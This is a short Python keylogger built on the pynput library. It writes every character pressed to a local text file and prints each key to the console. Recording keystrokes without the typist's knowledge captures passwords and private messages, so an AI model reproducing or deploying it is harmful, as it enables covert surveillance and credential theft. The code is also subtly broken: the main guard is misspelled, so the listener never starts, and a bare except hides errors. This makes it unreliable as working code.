from pynput import keyboard

def keyprsd(key):
    print(str(key))
    with open("keyfile.txt","a") as logkey:
        try:
            char=key.char
            logkey.write(char)
        except:
            print("error getting char")

if __name__=="_main_":
    listener=keyboard.Listener(on_press=keyprsd)
    listener.start()
    input()